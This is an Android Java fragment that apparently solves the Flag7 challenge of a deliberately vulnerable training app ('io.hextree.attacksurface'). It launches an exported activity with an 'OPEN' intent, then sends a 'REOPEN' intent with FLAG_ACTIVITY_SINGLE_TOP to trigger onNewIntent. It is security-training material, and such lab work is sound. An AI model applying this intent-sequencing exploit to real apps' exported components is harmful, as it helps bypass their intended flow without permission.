package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

public class Flag7Fragment extends Fragment {
    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag7, container, false);
        Button launchButton = view.findViewById(R.id.btnLaunchFlag7);
        launchButton.setOnClickListener(v -> {

            Intent openIntent = new Intent();
            openIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity"));
            openIntent.setAction("OPEN");
            startActivity(openIntent);

            Handler handler = new Handler();
            handler.postDelayed(() -> {
                // Send the "REOPEN" action to trigger onNewIntent
                Intent reopenIntent = new Intent();
                reopenIntent.setAction("REOPEN");
                reopenIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity"));
                reopenIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                startActivity(reopenIntent);
            }, 2000);
        });
        return view;
    }
} 